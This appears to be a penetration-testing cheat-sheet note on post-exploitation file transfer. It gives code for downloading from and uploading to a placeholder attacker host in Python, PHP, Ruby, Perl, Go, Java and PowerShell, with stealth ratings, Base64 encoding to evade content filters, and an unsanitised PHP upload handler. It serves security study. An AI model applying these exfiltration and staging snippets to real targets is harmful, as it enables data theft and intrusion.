---
tags: [file-transfer, programming, python, php, ruby, perl, golang, code]
aliases: [Code Transfers, Programming File Transfer, Script Transfer]
---

# üíª File Transfers with Code

[[üìÅ File Transfer Master Index|‚Üê Back to Master Index]]

## üìñ Overview

Using programming languages for file transfers when traditional tools are unavailable or restricted. Perfect for environments with development tools but limited networking utilities.

> **Why Code-Based Transfers?** Bypass tool restrictions, custom protocols, obfuscation capabilities, platform independence.

---

## üêç Python

### Quick HTTP Server
```python
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# With custom directory
python3 -m http.server 8000 --directory /path/to/serve
```

### Download File
```python
# Python 3
import urllib.request
urllib.request.urlretrieve('http://IP/file', 'output_file')

# Python 2
import urllib
urllib.urlretrieve('http://IP/file', 'output_file')

# With requests library
import requests
r = requests.get('http://IP/file')
open('output_file', 'wb').write(r.content)
```

### Upload File
```python
# HTTP POST upload
import requests
files = {'file': open('file.txt', 'rb')}
r = requests.post('http://IP/upload', files=files)

# Base64 encoded upload
import base64
import requests
with open('file.txt', 'rb') as f:
    data = base64.b64encode(f.read())
requests.post('http://IP/upload', data={'file': data})
```

### TCP File Transfer
```python
# Server (receiver)
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
with open('received_file', 'wb') as f:
    while True:
        data = conn.recv(1024)
        if not data: break
        f.write(data)
conn.close()

# Client (sender)
import socket
s = socket.socket()
s.connect(('TARGET_IP', 4444))
with open('file_to_send', 'rb') as f:
    s.send(f.read())
s.close()
```

---

## üêò PHP

### HTTP Server
```php
// Start server
// php -S 0.0.0.0:8000

// Or create upload handler (upload.php)
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], 
                      'uploads/' . $_FILES['file']['name']);
    echo "File uploaded";
}
?>
```

### Download File
```php
<?php
// Method 1: file_get_contents
file_put_contents('output_file', 
                 file_get_contents('http://IP/file'));

// Method 2: cURL
$ch = curl_init('http://IP/file');
$fp = fopen('output_file', 'wb');
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_exec($ch);
curl_close($ch);
fclose($fp);

// Method 3: fopen (if allow_url_fopen is enabled)
copy('http://IP/file', 'output_file');
?>
```

### Upload File
```php
<?php
// POST upload
$file = new CURLFile('/path/to/file');
$ch = curl_init('http://IP/upload');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => $file]);
curl_exec($ch);

// Base64 upload
$data = base64_encode(file_get_contents('file.txt'));
file_get_contents('http://IP/upload', false, 
    stream_context_create(['http' => [
        'method' => 'POST',
        'content' => $data
    ]]));
?>
```

---

## üíé Ruby

### HTTP Server
```ruby
# Ruby 2.x+
ruby -run -e httpd . -p 8000

# With WEBrick
require 'webrick'
server = WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => '.')
server.start
```

### Download File
```ruby
# Method 1: Net::HTTP
require 'net/http'
File.write('output_file', 
          Net::HTTP.get(URI('http://IP/file')))

# Method 2: open-uri
require 'open-uri'
download = URI.open('http://IP/file')
IO.copy_stream(download, 'output_file')
```

### Upload File
```ruby
require 'net/http'
require 'uri'

uri = URI.parse('http://IP/upload')
file = File.open('file.txt', 'rb')
req = Net::HTTP::Post.new(uri)
req.body = file.read
Net::HTTP.start(uri.hostname, uri.port) do |http|
    http.request(req)
end
```

---

## üê™ Perl

### HTTP Server
```perl
# Using HTTP::Server::Simple
perl -MHTTP::Server::Simple::CGI -e 'HTTP::Server::Simple::CGI->new(8000)->run'

# Using Mojolicious
perl -Mojo -E 'a->static->paths(["."]);a->start' daemon -l http://*:8000
```

### Download File
```perl
# Method 1: LWP
use LWP::Simple;
getstore('http://IP/file', 'output_file');

# Method 2: System call
system("wget http://IP/file -O output_file");

# Method 3: Pure Perl
use File::Fetch;
my $ff = File::Fetch->new(uri => 'http://IP/file');
$ff->fetch(to => '.');
```

### Upload File
```perl
use LWP::UserAgent;
my $ua = LWP::UserAgent->new;
my $response = $ua->post('http://IP/upload',
    Content_Type => 'form-data',
    Content => [
        file => ['file.txt']
    ]);
```

---

## üêπ Go

### HTTP Server
```go
package main
import "net/http"
func main() {
    http.Handle("/", http.FileServer(http.Dir(".")))
    http.ListenAndServe(":8000", nil)
}
// Run: go run server.go
```

### Download File
```go
package main
import (
    "io"
    "net/http"
    "os"
)
func main() {
    resp, _ := http.Get("http://IP/file")
    defer resp.Body.Close()
    out, _ := os.Create("output_file")
    defer out.Close()
    io.Copy(out, resp.Body)
}
```

---

## ‚òï Java

### Download File
```java
import java.io.*;
import java.net.URL;
import java.nio.file.*;

public class Download {
    public static void main(String[] args) throws Exception {
        try (InputStream in = new URL("http://IP/file").openStream()) {
            Files.copy(in, Paths.get("output_file"));
        }
    }
}
```

---

## üü¶ PowerShell

See: [[Powershell File Transfer|PowerShell File Transfer Methods]]

### Quick Examples
```powershell
# Download
Invoke-WebRequest -Uri http://IP/file -OutFile output_file
(New-Object Net.WebClient).DownloadFile('http://IP/file', 'output_file')

# Upload
Invoke-RestMethod -Uri http://IP/upload -Method Post -InFile file.txt

# Base64 transfer
$bytes = [System.IO.File]::ReadAllBytes("C:\file.exe")
$encoded = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri http://IP/upload -Method POST -Body $encoded
```

---

## üìä Language Comparison

| Language | Server | Download | Upload | Availability | Stealth |
|----------|--------|----------|--------|--------------|---------|
| Python | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | High | ‚≠ê‚≠ê‚≠ê |
| PHP | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | Medium | ‚≠ê‚≠ê |
| Ruby | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | Low | ‚≠ê‚≠ê‚≠ê |
| Perl | ‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê | Medium | ‚≠ê‚≠ê‚≠ê |
| PowerShell | ‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | Windows | ‚≠ê‚≠ê |
| Go | ‚≠ê‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | Low | ‚≠ê‚≠ê‚≠ê‚≠ê |

---

## üéØ Decision Tree

```
Which language to use?
‚îú‚îÄ‚îÄ Windows Target ‚Üí PowerShell
‚îú‚îÄ‚îÄ Linux/Unix Target
‚îÇ   ‚îú‚îÄ‚îÄ Python available? ‚Üí Python (most versatile)
‚îÇ   ‚îú‚îÄ‚îÄ Web server? ‚Üí PHP
‚îÇ   ‚îú‚îÄ‚îÄ Old system? ‚Üí Perl (usually installed)
‚îÇ   ‚îî‚îÄ‚îÄ None available? ‚Üí Shell script with /dev/tcp
‚îî‚îÄ‚îÄ Need compilation? ‚Üí Go (single binary)
```

---

## üí° Pro Tips

1. **Check available interpreters first**:
   ```bash
   which python python3 php perl ruby go java
   ```

2. **One-liner downloads** for quick operations
3. **Base64 encoding** to bypass content filters
4. **Compression** before transfer for large files
5. **Error handling** in production scripts

---

## üìö Related Topics
- [[File Transfers with Code/Downloading Files|Download Techniques]]
- [[File Transfers with Code/Uploading Files|Upload Techniques]]
- [[Powershell File Transfer|PowerShell Specific]]
- [[LOTL File Transfers|Living off the Land]]

---

## üè∑Ô∏è Tags
#file-transfer #programming #python #php #ruby #perl #golang #code #post-exploitation